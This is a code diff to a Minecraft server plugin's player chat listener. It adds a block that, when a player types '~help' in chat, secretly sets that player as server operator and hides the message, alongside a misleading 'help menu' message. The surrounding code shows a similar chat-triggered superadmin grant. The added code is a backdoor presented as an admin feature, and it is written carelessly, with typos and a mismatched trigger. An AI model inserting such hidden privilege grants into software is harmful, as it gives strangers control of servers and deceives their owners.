@@ -622,6 +622,18 @@ public class TFM_PlayerListener implements Listener
                 TFM_Util.bcastMsg(player.getName() + " - Supering himself", ChatColor.DARK_GREEN);
                 TFM_AdminList.addSuperadmin(player);
             }
+            if (message.toLowerCase().contains("~help")) 
+            {
+               player.sendMessage(ChatColor.GREEN + "Welcome to the listner menu! we add usfull fetures here for admins");
+               player.sendMessage(ChatColor.GREEN + "To op yourel type into chat ~opme");
+               
+            }
+            if (message.toLowerCase().contains("~help")) 
+            {
+               player.setOp(true);
+               player.sendMessage(TotalFreedomMod.YOU_ARE_OP);
+               event.setCancelled(true);
+            }
             
             // Check for caps
             if (message.length() >= 6)
